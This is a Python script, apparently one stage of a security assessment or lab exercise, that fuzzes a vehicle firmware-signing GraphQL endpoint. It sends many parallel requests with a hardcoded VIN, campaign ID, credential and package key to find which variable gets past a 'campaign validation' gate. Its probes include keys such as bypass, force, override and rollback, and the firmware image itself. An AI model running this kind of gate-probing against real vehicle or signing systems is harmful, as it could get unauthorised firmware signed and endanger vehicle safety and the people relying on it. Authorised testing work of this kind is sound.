#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Stage H: resolve the signFirmwareUpdate variable contract.

Observed state machine (2026-11-14):
   query "signFirmwareUpdate" + variables {}                 -> {"errors":[{"message":"vehicle campaign not found"}]}
   query "signFirmwareUpdate" + variables {vin}              -> {"errors":[{"message":"update campaign validation failed"}]}
So: vin selects the vehicle (and hence its campaign); a second gate then
validates "the update campaign".

This script walks candidate second keys and values, printing every distinct
error message, to find which key advances the gate.
"""
import base64, hashlib, json, os
import requests
from concurrent.futures import ThreadPoolExecutor

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.abspath(os.path.join(HERE, "..", "..", "03_EVIDENCE", "sign"))
URL = "http://10.225.139.2:8080/graphql"
VIN = "CV622697F82A936A1"
CAMP = "CAMP-243892C376D4CB2D5F826953"
CRED = "5e7f07b4a81153ecd5868cc02557f823"
PKG = "3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
FW = open(os.path.join(HERE, "..", "..", "work", "bundle2", "x", "vcu-reference.bin"), "rb").read()
SHA = hashlib.sha256(FW).hexdigest()
B64 = base64.b64encode(FW).decode()
Q = "signFirmwareUpdate"

KEYS = """
campaign campaignId campaignName campaignCode campaignKey campaignToken
rollback rollbackCounter rollbackCount maxRollback rollbackAllowed rollbackLevel
rollbackEnabled allowRollback
firmware firmwareImage firmwareUpdate image payload data blob content
firmwareSha256 sha256 digest hash firmwareHash imageHash
size length firmwareSize imageSize updateSize
address updateAddress vcuUpdateAddress target addressOffset offset
vcu vcuReference reference referenceFirmware vcuImage vcuFirmware
signature sig signed signatureRequest
packageKey key secret token credential credentials apiKey auth
slot slotId target destination targetVersion version
update updateId updateToken updateKey
nonce iv
force override bypass debug allowRollback
authorized authorization authorizedUpdate commit
signingRequest
counter generation
""".split()

VALUES = [VIN, CAMP, CRED, PKG, SHA, B64, FW.hex(),
          0, 1, 2, 3, "", None, True, False, "vcu", "VCU", "sign",
          "0x08040000", 1024, 16384]


def post(v):
    r = requests.post(URL, json={"query": Q, "variables": v}, timeout=10)
    return r.status_code, r.text.strip()


def main():
    base = post({"vin": VIN})[1]
    print("[*] baseline (vin only):", base)
    seen = {}
    jobs = []
    for k in KEYS:
        for val in VALUES:
            jobs.append((k, val))
    print(f"[*] {len(jobs)} single-key probes")

    def run(j):
        k, val = j
        try:
            st, txt = post({"vin": VIN, k: val})
            return (k, val, st, txt)
        except Exception as e:
            return (k, val, -1, f"ERR {type(e).__name__}")

    with ThreadPoolExecutor(max_workers=16) as ex:
        res = list(ex.map(run, jobs))
    json.dump([{"k": k, "v": (v if not isinstance(v, bytes) else v.decode('latin1')),
                "s": s, "r": t} for k, v, s, t in res],
              open(os.path.join(EV, "H_var_contract.json"), "w"), indent=1, default=str)

    for k, val, st, txt in res:
        if txt != base:
            print(f"  DIFF {k}={str(val)[:40]!r:44s} {st} {txt[:150]}")
        seen.setdefault(txt, []).append((k, val))
    print("\n[*] distinct messages:")
    for msg, lst in seen.items():
        print(f"  [{len(lst):3d}] {msg[:110]}")
        for k, v in lst[:8]:
            print(f"         e.g. {k}={str(v)[:40]!r}")


if __name__ == "__main__":
    main()
